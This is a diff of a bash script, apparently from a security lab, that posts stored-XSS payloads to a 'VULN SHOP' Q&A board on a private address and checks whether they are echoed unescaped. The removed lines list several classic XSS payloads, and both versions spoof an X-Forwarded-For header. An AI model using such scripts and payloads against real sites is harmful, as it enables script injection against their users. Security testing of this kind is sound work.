@@ -1,39 +1,34 @@
 #!/bin/bash
-# XSS (Cross-Site Scripting) Test Script
-# Target: VULN SHOP Q&A Board
+# Stored XSS 테스트 스크립트
+# 사용법: ./xss-test.sh [payload]
 
-TARGET="http://10.210.136.53:3000"
+TARGET="http://192.168.0.28:3000"
 MY_IP="10.0.0.101"
+PAYLOAD="${1:-<script>alert('XSS')</script>}"
 
-echo "[*] Stored XSS Test - Q&A Board"
-echo "[*] Target: $TARGET/board"
+echo "[*] Stored XSS 테스트"
+echo "[*] 타겟: $TARGET/board"
+echo "[*] 페이로드: $PAYLOAD"
 echo ""
 
-# Test various XSS payloads
-payloads=(
-    "<script>alert('XSS')</script>"
-    "<img src=x onerror=alert('XSS')>"
-    "<svg onload=alert('XSS')>"
-    "<body onload=alert('XSS')>"
-    "javascript:alert('XSS')"
-)
+# XSS 페이로드 게시
+curl -s -X POST \
+    -H "X-Forwarded-For: $MY_IP" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    --data-urlencode "content=$PAYLOAD" \
+    "$TARGET/board" > /dev/null
 
-for payload in "${payloads[@]}"; do
-    echo "[*] Testing payload: $payload"
-
-    response=$(curl -s -X POST \
-        -H "X-Forwarded-For: $MY_IP" \
-        -H "Content-Type: application/x-www-form-urlencoded" \
-        --data-urlencode "content=$payload" \
-        "$TARGET/board" -i 2>&1)
-
-    if echo "$response" | grep -q "302"; then
-        echo "[+] Payload submitted successfully"
-    else
-        echo "[-] Submission failed"
-    fi
-done
-
+echo "[+] 페이로드 전송 완료"
 echo ""
-echo "[*] Checking board for XSS payloads..."
-curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" 2>&1 | grep -oP '<script>.*?</script>|<img[^>]*onerror[^>]*>' | head -5
+
+# 게시판에서 페이로드 확인
+echo "[*] 게시판에서 페이로드 확인:"
+curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" | grep -o "$PAYLOAD" | head -1
+
+if curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" | grep -q "$PAYLOAD"; then
+    echo ""
+    echo "[+] XSS 취약점 확인됨! 페이로드가 이스케이프 없이 출력됩니다."
+else
+    echo ""
+    echo "[-] 페이로드가 필터링되었거나 이스케이프되었습니다."
+fi
